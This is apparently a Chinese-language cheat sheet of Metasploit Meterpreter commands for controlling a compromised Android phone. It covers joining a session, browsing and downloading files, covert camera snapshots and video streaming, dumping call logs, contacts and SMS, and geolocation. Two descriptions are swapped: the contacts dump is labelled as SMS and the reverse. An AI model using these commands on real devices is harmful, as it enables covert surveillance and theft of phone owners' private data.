
```text


sessions   //查看连接状态

sessions 1  //与ID为1的Android设备连接

//连接后常用命令

直接help  或者 ？

help

常用的命令（以后用一条写一条）

 cd               --&gt;目录切换，命令：cd /  切换到根目录  
search           --&gt;搜索文件，命令：search \*.jpg  
download         --&gt;下载文件，命令：download test.jpg  
webcam_list      --&gt;查看摄像头列表，因为手机都是前置和后置摄像头了  
webcam_snap      --&gt;拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1  
webcam_stream    --&gt;开启摄像头视频监控，同上，命令：webcam\_stream -i 1  
安卓系统相关命令：  
check_root       --&gt;查看当前安卓是否已经root
dump_calllog     --&gt;下载通话记录  
dump_contacts    --&gt;下载短信记录  
dump_sms         --&gt;下载通讯录  
geolocate        --&gt;利用谷歌地图定位（需要安装谷歌地图）

其他
ps 获取靶机正在运行的进程
getpid 查看msfshell的进程号

```